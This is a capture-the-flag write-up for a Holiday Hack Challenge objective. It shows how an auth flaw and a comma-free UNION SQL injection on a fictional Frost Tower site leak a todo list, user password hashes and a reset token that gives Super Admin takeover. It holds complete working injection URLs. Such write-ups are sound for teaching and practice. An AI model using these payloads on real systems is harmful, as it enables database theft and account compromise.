# Objective 12: Frost Tower Website Checkup
**Location: Studio, Frost Tower, 16<sup>th</sup> Floor, https://staging.jackfrosttower.com/**  
**Troll: Ingreta Tude**  
**Hints provided by Ribb Bonbowford after completion of [Elf Code Python](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/Elf%20Code%20Python.md)**

This objective is to perform a security assessment of the Frost Tower website with the [source code](https://download.holidayhackchallenge.com/2021/frosttower-web.zip) being provided.
It has to be found, which job position Jack Frost plans to offer Santa on his todo list.

### Auth flaw

The application tracks the user's session in `session` (login name, user's role etc.).
It was found that a valid session is also set, if you complete the [contact form](https://staging.jackfrosttower.com/contact) whilst the email address is already captured in the database. So you could just register twice to get a valid user session for an unprivileged user.
```
app.post('/postcontact', function(req, res, next){
[...]
        var rowlength = rows.length;
        if (rowlength >= "1"){
            session = req.session;
            session.uniqueID = email;
            req.flash('info', 'Email Already Exists');
            res.redirect("/contact");
```            
### SQLi flaw

Using this unprivileged user session, an SQLi flaw in the function to get user details could be used to retrieve more information from the database.
```
app.get('/detail/:id', function(req, res, next) {
    session = req.session;
    var reqparam = req.params['id'];
    var query = "SELECT * FROM uniquecontact WHERE id=";
    if (session.uniqueID){
        try {
            if (reqparam.indexOf(',') > 0){
                var ids = reqparam.split(',');
                reqparam = "0";
                for (var i=0; i<ids.length; i++){
                    query += tempCont.escape(m.raw(ids[i]));
                    query += " OR id="
                }
                query += "?";
            }else{
                query = "SELECT * FROM uniquecontact WHERE id=?"
            }
        } catch (error) {
            console.log(error);
            return res.sendStatus(500);
        }

        tempCont.query(query, reqparam, function(error, rows, fields){
```
As only caveat it has to be ensured, that the **comma character has to be avoided** in the SQL statement as the application splits up the query at the commas.
Furthermore it is important to note that "union" requires that the **number of columns on both sides match**.
Due to the fact, that the ```uniquecontact``` table has 7 columns, it has to be ensured, that also on the right hand side of the `union` 7 columns have to be delivered.

This URL is the base for all following SQLi attacks:
```
https://staging.jackfrosttower.com/detail/0,0 union
```
During research a [very good explanation](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/) about how to avoid commas in SQL statements and how to get to the right amount of columns was found and the attacks outlined below follow exactly this approach.


### Getting access to Jack Frosts todo list

We can obtain a list of all interesting tables in the MySQL database using this SQL statement:
```
select table_name from information_schema.tables;
```
This can be rewritten for our SQLi flaw:
```
https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select table_name from information_schema.tables)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
```
This reveals, that in addition to the tables `emails` and `uniquecontact`, which are known as they are used in the application and in the provided schema of encontact `encontact_db.sql`, there is an additional table `todo`, which seems to be the todo list we need access to.

Using the SQL statement
```
select column_name from information_schema.columns where table_name="todo";
```
the list of columns in the table `todo` can be obtained.
This can be rewritten for the SQLi as follows:
```
https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select column_name from information_schema.columns where table_name="todo")d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
```
we can see, that this table consists out of 3 columns: `id`, `note`, `completed`.
The `note` column can then be extracted using
```
select note from todo;
```
Rewritten for the SQLi:
```
https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select note from todo)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
```
This brings up Jack Frosts todo list:

 - Buy up land all around Santa's Castle
 - Build bigger and more majestic tower next to Santa's
 - Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history
- Dishearten Santa's elves and encourage defection to our cause
- Steal Santa's sleigh technology and  build a competing and way better Frosty present delivery vehicle
- Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem 
- Force Santa to cancel Christmas
- SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha!
- With Santa defeated, offer the old man a job as a **clerk** in the Frost Tower Gift Shop so we can keep an eye on him

---
### Bonus: Getting Super Admin privileges in the application


Using the SQLi flaw, a full list of registered users and admins (along with password hashes and privilege levels) can be retrieved using this link:
```
https://staging.jackfrosttower.com/detail/0,0 union select * from users--
```
This contains for example:
 - Super Admin
 - root@localhost
 - $2b$10$JnLy8pq1fC/KrS.bn1NAOx13GzDavIOZJkuayDC7JSCNKvQUha3i
 - 1
 - November 23rd, 2021 11:00:00
 - December 18th, 2021 7:05:17

---
- Admin
- admin@localhost
- $2b$10$FTkzq07Az57M.Q8jw7ehB..h5Vdc3Vw04zQzJIt294bgwg7.aV1GC
- 2
- December 3rd, 2021 11:00:00

This shows, that we have a "Super Admin" with the email address root@localhost defined in the system.

Next the "[forgot password](https://staging.jackfrosttower.com/forgotpass)" function of the application can be used to increase the privileges.
When resetting the password for a user, a random token is created and stored in the user database in the column `token`. If we are able to get hold of this token, we can change the password of the user and have full control.

The token for the Super Admin "root@localhost" can be retrieved using this URL:
```
https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a join (select 2)b join (select 3)c join (select token from users where email="root@localhost")d join (select 4)e join (select 5)f join (select 6)g;--
```

Using the URL https://staging.jackfrosttower.com/forgotpass/token/{retrieved_token} it is possible to set a new password for the "Super Admin" user.
Being logged on as this user, a new personalized user with "Super Admin" privileges can be created.

**Achievement: Frost Tower Website Checkup**




